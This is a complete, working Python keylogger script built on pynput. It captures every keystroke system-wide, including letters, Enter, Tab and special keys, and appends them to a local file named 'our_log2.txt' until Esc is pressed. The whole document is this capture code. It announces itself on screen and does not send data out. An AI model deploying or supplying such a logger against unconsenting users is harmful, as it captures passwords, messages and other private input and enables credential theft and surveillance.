from pynput.keyboard import Key, Listener

log_file = "our_log2.txt"

def on_press(key):
    try:
        # Open file in append mode
        with open(log_file, "a", encoding="utf-8") as f:
            if hasattr(key, 'char') and key.char is not None:
                # Letters and numbers: 'a''b''c'
                f.write(f"{key.char}")
            
            elif key == Key.space:
                # Space remains on the same line
                f.write(" ")
                
            elif key == Key.enter:
                # ONLY here do we add a newline \n
                f.write(" [ENTER]\n")

            elif key == Key.tab:
                f.write(" [TAB]\t")    

            else:
                # Special keys stay on the same line in brackets
                f.write(f" [{str(key).replace('Key.', '')}]")
            
            # Ensure it writes to the file immediately
            f.flush()

    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == Key.esc:
        return False

print("Monitoring... Everything stays on one line until you hit Enter.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()